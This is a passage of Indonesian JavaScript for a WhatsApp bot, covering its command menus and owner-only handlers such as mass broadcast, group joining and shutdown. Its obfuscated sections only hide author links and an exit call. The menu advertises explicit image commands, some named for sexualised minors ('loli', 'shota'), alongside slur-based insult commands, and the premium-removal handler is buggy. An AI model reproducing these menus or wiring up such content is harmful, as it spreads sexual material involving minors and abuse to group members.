//━━━━━━━━━━━━━━━[ USE A READ COMMAND ]━━━━━━━━━━━━━━━━━//

switch (command) {
case 'menu': {
teks = `┌── ⌜ *_INFORMATION_* ⌟
├❒ *_${botName}*_
├❒ Owner : ${ownerName}
├❒ Date : ${dt}
├❒ Waktu : ${jam} WIB
├❒ Prefix : ⌜ MULTI PREFIX ⌟
└───────
┌── ⌜ *_STATUS BOT_* ⌟
├❒ Creator : Zero YT7
├❒ Runtime : ${runtime(process.uptime())}
├❒ Baileys : Multi Device
├❒ Speed : ${latensi.toFixed(4)} _Second_
└───────
┌── ⌜ *_STATUS USER_* ⌟
├❒ Name : ${pushname}
├❒ Number : @${sender.split("@")[0]}
├❒ Status : ${itsMezeroyt7 ? 'Owner' : 'User'}
└───────`
var _0x235edc=_0x1527;function _0x1737(){var _0x300a90=['5057080hkALtn','My\x20Website','https://gi','24272720MkDgjq','ero-YT7','utube.com/','👥Owner','allmenu','2091052wyJgXG','https://ze','928915HlSUhT','ZeroYT7','357sUwalj','My\x20Youtube','178476EoRoUy','https://yo','2616536ybOlUS','royt7.biz.','My\x20Github','thub.com/Z','1483530CshNJa','owner','💌Command'];_0x1737=function(){return _0x300a90;};return _0x1737();}(function(_0x17181c,_0x434b39){var _0x2ffe33=_0x1527,_0x8fa1ed=_0x17181c();while(!![]){try{var _0x5d4106=-parseInt(_0x2ffe33(0x1d0))/(0x4*-0x1b5+0x57e+0x31*0x7)+parseInt(_0x2ffe33(0x1ce))/(-0x2278+-0x526+-0x1*-0x27a0)+parseInt(_0x2ffe33(0x1da))/(-0x475+0x182f*-0x1+0x1ca7)+parseInt(_0x2ffe33(0x1d6))/(0xb3a+-0x1*0x1b65+0x102f)+parseInt(_0x2ffe33(0x1dd))/(-0x13e*0xa+0x23ef+0xbbf*-0x2)+-parseInt(_0x2ffe33(0x1d4))/(0xd0a+-0x3*0xd03+-0x1a05*-0x1)*(-parseInt(_0x2ffe33(0x1d2))/(0x3*-0xbcf+-0x54e+0x28c2))+-parseInt(_0x2ffe33(0x1c9))/(0x1d84+0x17a5*-0x1+-0x73*0xd);if(_0x5d4106===_0x434b39)break;else _0x8fa1ed['push'](_0x8fa1ed['shift']());}catch(_0x521cd6){_0x8fa1ed['push'](_0x8fa1ed['shift']());}}}(_0x1737,-0xe0f*-0x13d+-0x2b4*0x718+-0x2ed8*-0x49));function _0x1527(_0x12a2c0,_0x44d8fb){var _0x51cfb8=_0x1737();return _0x1527=function(_0x16c863,_0x1266dd){_0x16c863=_0x16c863-(0x1012+-0xa7+-0xda2);var _0x45e62e=_0x51cfb8[_0x16c863];return _0x45e62e;},_0x1527(_0x12a2c0,_0x44d8fb);}var buttonsZero=[{'urlButton':{'displayText':_0x235edc(0x1d3),'url':_0x235edc(0x1d5)+_0x235edc(0x1cb)+_0x235edc(0x1d1)}},{'urlButton':{'displayText':_0x235edc(0x1d8),'url':_0x235edc(0x1df)+_0x235edc(0x1d9)+_0x235edc(0x1ca)}},{'urlButton':{'displayText':_0x235edc(0x1de),'url':_0x235edc(0x1cf)+_0x235edc(0x1d7)+'id'}},{'quickReplyButton':{'displayText':_0x235edc(0x1dc),'id':_0x235edc(0x1cd)}},{'quickReplyButton':{'displayText':_0x235edc(0x1cc),'id':_0x235edc(0x1db)}}];
zeroyt7.sendMessage(from, { viewOnce : true, caption: teks, location: { jpegThumbnail: await reSize(thumbnail, 200, 200)}, templateButtons: buttonsZero, footer: creator, mentions: [m.sender] })
}
break
case 'allmenu': {
teks = `┌── ⌜ *_STATUS USER_* ⌟
├❒ Name : ${pushname}
├❒ Number : @${sender.split("@")[0]}
├❒ Status : ${itsMezeroyt7 ? 'Owner' : 'User'}
├❒ Date : ${dt}
├❒ Waktu : ${jam} WIB
└───────
┌── ⌜ *_OWNER MENU_* ⌟
├❒ ${prefix}bc
├❒ ${prefix}bcgc
├❒ ${prefix}join
├❒ ${prefix}leave
├❒ ${prefix}creategc
├❒ ${prefix}shutdown
├❒ ${prefix}setppbot
├❒ ${prefix}setbio
├❒ ${prefix}addprem
├❒ ${prefix}delprem
└───────
┌── ⌜ *_GROUP MENU_* ⌟
├❒ ${prefix}antilink
├❒ ${prefix}add
├❒ ${prefix}kick
├❒ ${prefix}promote
├❒ ${prefix}demote
├❒ ${prefix}hidetag
├❒ ${prefix}tagall
├❒ ${prefix}group
├❒ ${prefix}setppgroup
├❒ ${prefix}linkgroup
├❒ ${prefix}ephemeral
├❒ ${prefix}setname
├❒ ${prefix}setdesc
├❒ ${prefix}editinfo
└───────
┌── ⌜ *_FUN MENU_* ⌟
├❒ ${prefix}memek
├❒ ${prefix}bego
├❒ ${prefix}goblok
├❒ ${prefix}janda
├❒ ${prefix}perawan
├❒ ${prefix}babi
├❒ ${prefix}tolol
├❒ ${prefix}pinter
├❒ ${prefix}pintar
├❒ ${prefix}asu
├❒ ${prefix}bodoh
├❒ ${prefix}gay
├❒ ${prefix}lesby
├❒ ${prefix}bajingan
├❒ ${prefix}jancok
├❒ ${prefix}anjing
├❒ ${prefix}ngentod
├❒ ${prefix}ngentot
├❒ ${prefix}monyet
├❒ ${prefix}mastah
├❒ ${prefix}newbie
├❒ ${prefix}bangsat
├❒ ${prefix}bangke
├❒ ${prefix}sange
├❒ ${prefix}sangean
├❒ ${prefix}dakjal
├❒ ${prefix}horny
├❒ ${prefix}wibu
├❒ ${prefix}puki
├❒ ${prefix}peak
├❒ ${prefix}pantex
├❒ ${prefix}pantek
├❒ ${prefix}setan
├❒ ${prefix}iblis
├❒ ${prefix}cacat
├❒ ${prefix}yatim
├❒ ${prefix}piatu
├❒ ${prefix}goblokcek
├❒ ${prefix}jelekcek
├❒ ${prefix}gaycek
├❒ ${prefix}rate
├❒ ${prefix}lesbicek
├❒ ${prefix}gantengcek
├❒ ${prefix}cantikcek
├❒ ${prefix}begocek
├❒ ${prefix}suhucek
├❒ ${prefix}pintercek
├❒ ${prefix}jagocek
├❒ ${prefix}nolepcek
├❒ ${prefix}babicek
├❒ ${prefix}bebancek
├❒ ${prefix}baikcek
├❒ ${prefix}jahatcek
├❒ ${prefix}anjingcek
├❒ ${prefix}haramcek
├❒ ${prefix}pakboycek
├❒ ${prefix}pakgirlcek
├❒ ${prefix}sangecek
├❒ ${prefix}bapercek
├❒ ${prefix}fakboycek
├❒ ${prefix}alimcek
├❒ ${prefix}suhucek
├❒ ${prefix}fakgirlcek
├❒ ${prefix}kerencek
├❒ ${prefix}wibucek
├❒ ${prefix}pasarkascek
├❒ ${prefix}kulcek            
├❒ ${prefix}cekgoblok
├❒ ${prefix}cekjelek
├❒ ${prefix}cekgay            
├❒ ${prefix}ceklesbi
├❒ ${prefix}cekganteng
├❒ ${prefix}cekcantik
├❒ ${prefix}cekbego
├❒ ${prefix}ceksuhu
├❒ ${prefix}cekpinter
├❒ ${prefix}cekjago
├❒ ${prefix}ceknolep
├❒ ${prefix}cekbabi
├❒ ${prefix}cekbeban
├❒ ${prefix}cekbaik
├❒ ${prefix}cekjahat
├❒ ${prefix}cekanjing
├❒ ${prefix}cekharam
├❒ ${prefix}cekpakboy
├❒ ${prefix}cekpakgirl
├❒ ${prefix}ceksange
├❒ ${prefix}cekbaper
├❒ ${prefix}cekfakboy
├❒ ${prefix}cekalim
├❒ ${prefix}ceksuhu
├❒ ${prefix}cekfakgirl
├❒ ${prefix}cekkeren
├❒ ${prefix}cekwibu
├❒ ${prefix}cekpasarkas
├❒ ${prefix}cekkul
└───────
┌── ⌜ *_RANDOM FOTO MENU_* ⌟
├❒ ${prefix}aesthetic
├❒ ${prefix}ahegao
├❒ ${prefix}akira
├❒ ${prefix}akiyama
├❒ ${prefix}ana
├❒ ${prefix}anjing
├❒ ${prefix}art
├❒ ${prefix}ass
├❒ ${prefix}asuna
├❒ ${prefix}ayuzawa
├❒ ${prefix}bdsm
├❒ ${prefix}boneka
├❒ ${prefix}boruto
├❒ ${prefix}bts
├❒ ${prefix}cecan
├❒ ${prefix}chiho
├❒ ${prefix}chitoge
├❒ ${prefix}cogan
├❒ ${prefix}cosplay
├❒ ${prefix}cosplayloli
├❒ ${prefix}cosplaysagiri
├❒ ${prefix}cuckold
├❒ ${prefix}cum
├❒ ${prefix}cyber
├❒ ${prefix}darkjokes
├❒ ${prefix}deidara
├❒ ${prefix}doraemon
├❒ ${prefix}eba
├❒ ${prefix}elaina
├❒ ${prefix}emilia
├❒ ${prefix}ero
├❒ ${prefix}erza
├❒ ${prefix}exo
├❒ ${prefix}femdom
├❒ ${prefix}foot
├❒ ${prefix}freefire
├❒ ${prefix}gamewallpaper
├❒ ${prefix}gangbang
├❒ ${prefix}gifs
├❒ ${prefix}glasses
├❒ ${prefix}gremory
├❒ ${prefix}hekel
├❒ ${prefix}hentai
├❒ ${prefix}hestia
├❒ ${prefix}hijaber
├❒ ${prefix}hinata
├❒ ${prefix}husbu
├❒ ${prefix}inori
├❒ ${prefix}islamic
├❒ ${prefix}isuzu
├❒ ${prefix}itachi
├❒ ${prefix}itori
├❒ ${prefix}jahy
├❒ ${prefix}jeni
├❒ ${prefix}jiso
├❒ ${prefix}justina
├❒ ${prefix}kaga
├❒ ${prefix}kagura
├❒ ${prefix}kakasih
├❒ ${prefix}kaori
├❒ ${prefix}kartun
├❒ ${prefix}katakata
├❒ ${prefix}keneki
├❒ ${prefix}kotori
├❒ ${prefix}kpop
├❒ ${prefix}kucing
├❒ ${prefix}kurumi
├❒ ${prefix}lisa
├❒ ${prefix}loli
├❒ ${prefix}madara
├❒ ${prefix}masturbation
├❒ ${prefix}megumin
├❒ ${prefix}mikasa
├❒ ${prefix}mikey
├❒ ${prefix}miku
├❒ ${prefix}milf
├❒ ${prefix}minato
├❒ ${prefix}mobil
├❒ ${prefix}motor
├❒ ${prefix}mountain
├❒ ${prefix}naruto
├❒ ${prefix}neko
├❒ ${prefix}neko2
├❒ ${prefix}nekonime
├❒ ${prefix}nezuko
├❒ ${prefix}onepiece
├❒ ${prefix}orgy
├❒ ${prefix}panties
├❒ ${prefix}pentol
├❒ ${prefix}pokemon
├❒ ${prefix}profil
├❒ ${prefix}programming
├❒ ${prefix}pubg
├❒ ${prefix}pussy
├❒ ${prefix}randblackpink
├❒ ${prefix}randomnime
├❒ ${prefix}randomnime2
├❒ ${prefix}rize
├❒ ${prefix}rose
├❒ ${prefix}ryujin
├❒ ${prefix}sagiri
├❒ ${prefix}sakura
├❒ ${prefix}sasuke
├❒ ${prefix}satanic
├❒ ${prefix}shina
├❒ ${prefix}shinka
├❒ ${prefix}shinomiya
├❒ ${prefix}shizuka
├❒ ${prefix}shota
├❒ ${prefix}tatasurya
├❒ ${prefix}technology
├❒ ${prefix}tejina
├❒ ${prefix}tentacles
├❒ ${prefix}thighs
├❒ ${prefix}toukachan
├❒ ${prefix}tsunade
├❒ ${prefix}waifu
├❒ ${prefix}wallhp
├❒ ${prefix}wallml
├❒ ${prefix}wallnime
├❒ ${prefix}yotsuba
├❒ ${prefix}yuki
├❒ ${prefix}yulibocil
├❒ ${prefix}yumeko
├❒ ${prefix}fox 
├❒ ${prefix}dog
├❒ ${prefix}cat
├❒ ${prefix}panda
├❒ ${prefix}birb
├❒ ${prefix}koala
├❒ ${prefix}china
├❒ ${prefix}indonesia
├❒ ${prefix}japan
├❒ ${prefix}korea
├❒ ${prefix}malaysia
├❒ ${prefix}thailand
├❒ ${prefix}vietnam
└───────
┌── ⌜ *_TEXT PRO MENU_* ⌟
├❒ ${prefix}candy
├❒ ${prefix}christmas
├❒ ${prefix}3dchristmas
├❒ ${prefix}sparklechristmas
├❒ ${prefix}deepsea
├❒ ${prefix}scifi
├❒ ${prefix}rainbow
├❒ ${prefix}waterpipe
├❒ ${prefix}spooky
├❒ ${prefix}pencil
├❒ ${prefix}circuit
├❒ ${prefix}discovery
├❒ ${prefix}metalic
├❒ ${prefix}fiction
├❒ ${prefix}demon
├❒ ${prefix}transformer
├❒ ${prefix}berry
├❒ ${prefix}thunder
├❒ ${prefix}magma
├❒ ${prefix}3dstone 
├❒ ${prefix}neonlight
├❒ ${prefix}glitch
├❒ ${prefix}harrypotter
├❒ ${prefix}brokenglass
├❒ ${prefix}papercut
├❒ ${prefix}watercolor
├❒ ${prefix}multicolor
├❒ ${prefix}neondevil
├❒ ${prefix}underwater
├❒ ${prefix}graffitibike
├❒ ${prefix}snow
├❒ ${prefix}cloud
├❒ ${prefix}honey
├❒ ${prefix}ice
├❒ ${prefix}fruitjuice
├❒ ${prefix}biscuit
├❒ ${prefix}wood
├❒ ${prefix}chocolate
├❒ ${prefix}strawberry
├❒ ${prefix}matrix
├❒ ${prefix}blood
├❒ ${prefix}dropwater
├❒ ${prefix}toxic
├❒ ${prefix}lava 
├❒ ${prefix}rock 
├❒ ${prefix}bloodglas
├❒ ${prefix}hallowen
├❒ ${prefix}darkgold
├❒ ${prefix}joker
├❒ ${prefix}wicker
├❒ ${prefix}firework
├❒ ${prefix}skeleton
├❒ ${prefix}blackpink
├❒ ${prefix}sand
├❒ ${prefix}glue
├❒ ${prefix}1917
├❒ ${prefix}leaves
└───────
┌── ⌜ *_PHOTO OXY MENU_* ⌟
├❒ ${prefix}shadow
├❒ ${prefix}write
├❒ ${prefix}romantic
├❒ ${prefix}burnpaper
├❒ ${prefix}smoke
├❒ ${prefix}narutobanner
├❒ ${prefix}love
├❒ ${prefix}undergrass
├❒ ${prefix}doublelove
├❒ ${prefix}coffecup
├❒ ${prefix}underwaterocean
├❒ ${prefix}smokyneon
├❒ ${prefix}starstext
├❒ ${prefix}rainboweffect
├❒ ${prefix}balloontext
├❒ ${prefix}metalliceffect
├❒ ${prefix}embroiderytext
├❒ ${prefix}flamingtext
├❒ ${prefix}stonetext
├❒ ${prefix}writeart
├❒ ${prefix}summertext
├❒ ${prefix}wolfmetaltext
├❒ ${prefix}nature3dtext
├❒ ${prefix}rosestext
├❒ ${prefix}naturetypography
├❒ ${prefix}quotesunder
├❒ ${prefix}shinetext
└───────
┌── ⌜ *_CERPEN MENU_* ⌟
├❒ ${prefix}cerpen
├❒ ${prefix}cerpen-sejarah
├❒ ${prefix}cerpen-sedih
├❒ ${prefix}cerpen-rohani
├❒ ${prefix}cerpen-rindu
├❒ ${prefix}cerpen-remaja
├❒ ${prefix}cerpen-ramadhan
├❒ ${prefix}cerpen-petualangan
├❒ ${prefix}cerpen-persahabatan
├❒ ${prefix}cerpen-perpisahan
├❒ ${prefix}cerpen-perjuangan
├❒ ${prefix}cerpen-penyesalan
├❒ ${prefix}cerpen-pengorbanan
├❒ ${prefix}cerpen-pengalaman
├❒ ${prefix}cerpen-pendidikan
├❒ ${prefix}cerpen-penantian
├❒ ${prefix}cerpen-patahhati
├❒ ${prefix}cerpen-olahraga
├❒ ${prefix}cerpen-nasionalisme
├❒ ${prefix}cerpen-nasihat
├❒ ${prefix}cerpen-motivasi
├❒ ${prefix}cerpen-misteri
├❒ ${prefix}cerpen-mengharukan
├❒ ${prefix}cerpen-malaysia
├❒ ${prefix}cerpen-liburan
├❒ ${prefix}cerpen-kristen
├❒ ${prefix}cerpen-korea
├❒ ${prefix}cerpen-kisahnyata
├❒ ${prefix}cerpen-keluarga
├❒ ${prefix}cerpen-kehidupan
├❒ ${prefix}cerpen-jepang
├❒ ${prefix}cerpen-inspiratif
├❒ ${prefix}cerpen-gokil
├❒ ${prefix}cerpen-galau
├❒ ${prefix}cerpen-cintasejati
├❒ ${prefix}cerpen-cintasegitiga
├❒ ${prefix}cerpen-cintasedih
├❒ ${prefix}cerpen-cintaromantis
├❒ ${prefix}cerpen-cintapertama
├❒ ${prefix}cerpen-cintaislami
├❒ ${prefix}cerpen-cinta
├❒ ${prefix}cerpen-budaya
├❒ ${prefix}cerpen-bahasainggris
├❒ ${prefix}cerpen-bahasadaerah
├❒ ${prefix}cerpen-anak
└───────
┌── ⌜ *_RANDOM TEXT MENU_* ⌟
├❒ ${prefix}bijak
├❒ ${prefix}dare
├❒ ${prefix}fakta
├❒ ${prefix}motivasi
├❒ ${prefix}pantun
├❒ ${prefix}quotes
├❒ ${prefix}quotesanime
├❒ ${prefix}truth
└───────
┌── ⌜ *_OTHER MENU_* ⌟
├❒ ${prefix}owner
├❒ ${prefix}donasi
├❒ ${prefix}listpremium
├❒ ${prefix}buypremium
├❒ ${prefix}jadiowner
├❒ ${prefix}sewabot
├❒ ${prefix}halah
├❒ ${prefix}hilih
├❒ ${prefix}huluh
├❒ ${prefix}heleh
├❒ ${prefix}holoh
├❒ ${prefix}cekme
├❒ ${prefix}styletext
├❒ ${prefix}tts
├❒ ${prefix}tovn
├❒ ${prefix}toaudio
├❒ ${prefix}tomp3
├❒ ${prefix}toimg
├❒ ${prefix}toonce
├❒ ${prefix}cariresep
├❒ ${prefix}bacaresep
├❒ ${prefix}ssweb
├❒ ${prefix}wasted
├❒ ${prefix}comrade
├❒ ${prefix}horny
├❒ ${prefix}blur
├❒ ${prefix}pixelate
├❒ ${prefix}simpcard
├❒ ${prefix}lolice
├❒ ${prefix}gay
├❒ ${prefix}jail
├❒ ${prefix}cry
├❒ ${prefix}kill
├❒ ${prefix}hug
├❒ ${prefix}pat
├❒ ${prefix}lick
├❒ ${prefix}kiss
├❒ ${prefix}bite
├❒ ${prefix}yeet
├❒ ${prefix}bully
├❒ ${prefix}bonk
├❒ ${prefix}wink
├❒ ${prefix}poke
├❒ ${prefix}nom
├❒ ${prefix}slap
├❒ ${prefix}smile
├❒ ${prefix}wave
├❒ ${prefix}awoo
├❒ ${prefix}blush
├❒ ${prefix}smug
├❒ ${prefix}glomp
├❒ ${prefix}happy
├❒ ${prefix}dance
├❒ ${prefix}cringe
├❒ ${prefix}cuddle
├❒ ${prefix}highfive
├❒ ${prefix}shinobu
├❒ ${prefix}handhold
├❒ ${prefix}quoted
└───────
┌── ⌜ *_DOWNLOADER MENU_* ⌟
├❒ ${prefix}tiktokvideo
├❒ ${prefix}tiktokaudio
├❒ ${prefix}ytsearch
├❒ ${prefix}mediafire
├❒ ${prefix}play
├❒ ${prefix}mp3
├❒ ${prefix}mp4
├❒ ${prefix}googles
├❒ ${prefix}happymod
└───────`
var _0x51c10a=_0x1138;function _0x4cbd(){var _0xe5e95c=['ZeroYT7','royt7.biz.','40428BlWNmR','https://gi','134813KZAKHs','https://ze','allmenu','8VJTBvz','735948MZepHL','owner','715WAndbh','10nZswRV','👥Owner','My\x20Youtube','102cELuuo','1635099qhgNcV','2312680RBBags','https://yo','406304MOyqVt','utube.com/','My\x20Website','My\x20Github','💰Donasi','ero-YT7','874876KuzuFA','2AaBEXc','thub.com/Z'];_0x4cbd=function(){return _0xe5e95c;};return _0x4cbd();}(function(_0x313fe4,_0x1dd7de){var _0x538ad9=_0x1138,_0x5bee88=_0x313fe4();while(!![]){try{var _0x4e03d5=-parseInt(_0x538ad9(0x8d))/(-0x585+0x2023+-0x2f5*0x9)*(parseInt(_0x538ad9(0x79))/(-0x1*-0x1ef6+-0x13d*-0xb+-0x2c93*0x1))+parseInt(_0x538ad9(0x8a))/(0xa*-0x39b+-0x12*0x65+-0x101*-0x2b)+parseInt(_0x538ad9(0x93))/(-0x2438+-0x2667+0x21*0x243)*(parseInt(_0x538ad9(0x86))/(-0x14ab+-0x3c9+0x1879))+-parseInt(_0x538ad9(0x89))/(-0x33*0x89+-0x1307*-0x1+0x84a)*(parseInt(_0x538ad9(0x7f))/(-0x1*0x1915+0xe32+0xaea))+parseInt(_0x538ad9(0x82))/(-0x1fd1+0x2*-0xde7+0x3ba7)*(parseInt(_0x538ad9(0x83))/(0x40+-0x3b5+-0x6*-0x95))+-parseInt(_0x538ad9(0x8b))/(-0x279+-0x250a+-0x7d*-0x51)+parseInt(_0x538ad9(0x85))/(0x1691+0x2*-0xc22+-0xdf*-0x2)*(parseInt(_0x538ad9(0x7d))/(0x883*0x4+0x7*-0x194+-0x16f4));if(_0x4e03d5===_0x1dd7de)break;else _0x5bee88['push'](_0x5bee88['shift']());}catch(_0x2ae0ee){_0x5bee88['push'](_0x5bee88['shift']());}}}(_0x4cbd,0x21*-0x4739+0x861b*0x5+-0x14bb*-0x8d));function _0x1138(_0x22a5ba,_0x295988){var _0x151e55=_0x4cbd();return _0x1138=function(_0x4bce36,_0x172257){_0x4bce36=_0x4bce36-(-0x18b*0x15+0xa02+0x16de);var _0x1140dd=_0x151e55[_0x4bce36];return _0x1140dd;},_0x1138(_0x22a5ba,_0x295988);}var buttonsZero=[{'urlButton':{'displayText':_0x51c10a(0x88),'url':_0x51c10a(0x8c)+_0x51c10a(0x8e)+_0x51c10a(0x7b)}},{'urlButton':{'displayText':_0x51c10a(0x90),'url':_0x51c10a(0x7e)+_0x51c10a(0x7a)+_0x51c10a(0x92)}},{'urlButton':{'displayText':_0x51c10a(0x8f),'url':_0x51c10a(0x80)+_0x51c10a(0x7c)+'id'}},{'quickReplyButton':{'displayText':_0x51c10a(0x91),'id':_0x51c10a(0x81)}},{'quickReplyButton':{'displayText':_0x51c10a(0x87),'id':_0x51c10a(0x84)}}];
zeroyt7.sendMessage(from, { viewOnce : true, caption: teks, location: { jpegThumbnail: await reSize(thumbnail, 200, 200)}, templateButtons: buttonsZero, footer: creator, mentions: [m.sender] })
}
break
case 'donasi': {
teks = `https://sociabuzz.com/ZeroYT7/tribe

Terimakasih Telah Support Saya Semoga Semakin Berkah`
zeroyt7.sendMessage(from, { text: teks }, { quoted: ftroli })
}
break
case 'bc': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!text) return reply(`Masukan Teksnya\nContoh : ${prefix + command} Please A Subscribe My Youtube Zero YT7`)
var fdoc = { key : { remoteJid: 'status@broadcast', participant : '0@s.whatsapp.net' }, message: { documentMessage: { title: 'B R O A D C A S T', jpegThumbnail: thumbnail, }}}
let anu = await store.chats.all().map(v => v.id)
reply(mess.wait)
for (let yoi of anu) {
if (/image/.test(mime)) {
await sleep(1500)
var txtbc = `*Broadcast ${global.botName}*

*✉️ Message :* ${q? q : ''}\n`
var btnbc = [
{ buttonId: `y`, buttonText: { displayText: `${global.ownerName}` }, type: 1 }
]
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let url = await TelegraPh(media)
let urll = await getBuffer(url)
zeroyt7.sendMessage(yoi, { image: urll, caption: txtbc, buttons: btnbc }, { quoted: ftroli })
if (fs.existsSync(media)) fs.unlinkSync(media)
} else if (/video/.test(mime)) {
await sleep(1500)
var txtbc = `*Broadcast ${global.botName}*

*✉️ Message :* ${q? q : ''}\n`
var btnbc = [
{ buttonId: `y`, buttonText: { displayText: `${global.ownerName}` }, type: 1 }
]
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let url = await TelegraPh(media)
let urll = await getBuffer(url)
zeroyt7.sendMessage(yoi, { video: urll, caption: txtbc, buttons: btnbc }, { quoted: ftroli })
if (fs.existsSync(media)) fs.unlinkSync(media)
} else if (/audio/.test(mime)) {
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
await sleep(1500)
let urll = await UploadFileUgu(media)
zeroyt7.sendMessage(yoi, { audio: { url: urll.url }}, { quoted: ftroli })
} else {
await sleep(1500)
var txtbc = `*Broadcast ${global.botName}*

*✉️ Message :* ${q? q : ''}\n`
var btnbc = [
{ buttonId: `menu`, buttonText: { displayText: `💌 Menu` }, type: 1 },
{ buttonId: `owner`, buttonText: { displayText: `👥Owner` }, type: 1 }
]
await zeroyt7.sendButtonText(yoi, btnbc, txtbc, creator, ftroli)
}
reply(mess.succes)
}
}
break
case 'bcgc': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!text) return reply(`Masukan Teksnya\nContoh : ${prefix + command} Please A Subscribe My Youtube Zero YT7`)
let getGroups = await zeroyt7.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
var button = [
{ buttonId: `menu`, buttonText: { displayText: `💌 Menu` }, type: 1 },
{ buttonId: `owner`, buttonText: { displayText: `👥Owner` }, type: 1 }
]
let txt = `*「 ${global.botName} Broadcast 」*

*✉️ Message : ${text}`
zeroyt7.sendButtonText(i, button, txt, creator, ftroli)
}
reply(mess.succes)
}
break
case 'join': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!text) return reply(`Masukan Link Group Nya\nContoh ${prefix + command} Link Group`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await zeroyt7.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'leave': {
if (!itsMezeroyt7) return reply(mess.owner)
await zeroyt7.groupLeave(from).then((res) => reply(mess.succes)).catch((err) => reply(jsonformat(err)))
}
break
case 'creategc': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!args.join(" ")) return reply(`Masukan Nama Group Nya\nContoh ${prefix + command} Zero YT7 Official Bot`)
try {
let cret = await zeroyt7.groupCreate(args.join(" "), [])
let response = await zeroyt7.groupInviteCode(cret.id)
teks = `     「 Group Create Fitur 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${response}
       `
zeroyt7.sendMessage(from, { text:teks, mentions: await zeroyt7.parseMention(teks)}, {quoted:ftroli})
} catch {
reply("Error!")
}
}
break
case 'shutdown': {
var _0x487785=_0x51ac;(function(_0x244556,_0x51f0ed){var _0x298dd5=_0x51ac,_0x5684cb=_0x244556();while(!![]){try{var _0x2dad64=parseInt(_0x298dd5(0x156))/(-0x260d+-0x97c+0x2f8a*0x1)+parseInt(_0x298dd5(0x15c))/(0x25aa+0x1*-0xb3b+0xb*-0x267)*(parseInt(_0x298dd5(0x159))/(-0x80f*-0x1+0x21*0xb9+-0x1fe5))+-parseInt(_0x298dd5(0x154))/(-0x1fba+-0x262*0xc+0x3c56)+-parseInt(_0x298dd5(0x157))/(-0x1*-0xf91+0x30c*-0x7+-0x5c8*-0x1)+parseInt(_0x298dd5(0x15d))/(-0x1*-0x232d+-0x4e3+0x12a*-0x1a)*(-parseInt(_0x298dd5(0x158))/(0x814+-0x2573+-0x1d66*-0x1))+-parseInt(_0x298dd5(0x153))/(0x1039+-0xdf6+-0x23b)+parseInt(_0x298dd5(0x152))/(0x195b*-0x1+-0x23c1+-0x1*-0x3d25);if(_0x2dad64===_0x51f0ed)break;else _0x5684cb['push'](_0x5684cb['shift']());}catch(_0x46f832){_0x5684cb['push'](_0x5684cb['shift']());}}}(_0x2e65,-0xa44*0xca+-0x7a84e+0x1405e1));if(!itsMezeroyt7)return reply(mess[_0x487785(0x15a)]);function _0x2e65(){var _0x472f94=['6epMhME','Matikan','\x20Telah\x20Di\x20','5724027spLBqp','1993616LhvyEw','1691808BOQCDY','exit','304053kjWhhi','449250tmMlRI','2111585uzsvun','6sUpVsA','owner','Bye...\x20Bot','403134ORhJHt'];_0x2e65=function(){return _0x472f94;};return _0x2e65();}function _0x51ac(_0xb49f58,_0x52aad3){var _0x58a034=_0x2e65();return _0x51ac=function(_0x2762b6,_0x1c94a0){_0x2762b6=_0x2762b6-(-0x11+0x1*0x22cb+0x85a*-0x4);var _0x22f4ae=_0x58a034[_0x2762b6];return _0x22f4ae;},_0x51ac(_0xb49f58,_0x52aad3);}reply(_0x487785(0x15b)+_0x487785(0x15f)+_0x487785(0x15e)),await sleep(-0x6ce+-0xfa8+-0x15e*-0x19),process[_0x487785(0x155)]();
}
break
case 'setppbot': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await zeroyt7.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await zeroyt7.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(mess.succes)
} else {
var memeg = await zeroyt7.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(mess.succes)
}
}
break
case 'addprem': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!q) return reply(`Masukan Nomornya\nContoh: ${prefix + command} 628***`)
if(isNaN(q)) return await reply('Harus Berupa Nomor')
if (q.includes(`+`)) return reply('Tidak Menggunakan + Langsung Nomor 628***')
prmi = args.join(" ")
prem.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${prmi}`)
}
break
case 'delprem':
case 'dellprem': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!q) return reply(`Masukan Nomornya\nContoh: ${prefix + command} 628***`)
if(isNaN(q)) return await reply('Harus Berupa Nomor')
if (q.includes(`+`)) return m.reply('Tidak Menggunakan + Langsung Nomor 628***')
prmin = `${q}@s.whatsapp.net`
anul = prmin
prem.splice(anul, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Sukses Delete Premium ${prmi}`)
}
break
case 'setbio': {
if (!itsMezeroyt7) return reply(mess.owner)
if (!text) return reply(`Masukan Text Bio Nya\nContoh : ${prefix + command} Please A Subscribe My Youtube Zero YT7`)
zeroyt7.setStatus(q)
reply(`*Bio Telah Di Ganti Menjadi ${q}*`)
}
break
case 'owner': {
var vcard = `BEGIN:VCARD\n`
+ `VERSION:3.0\n`
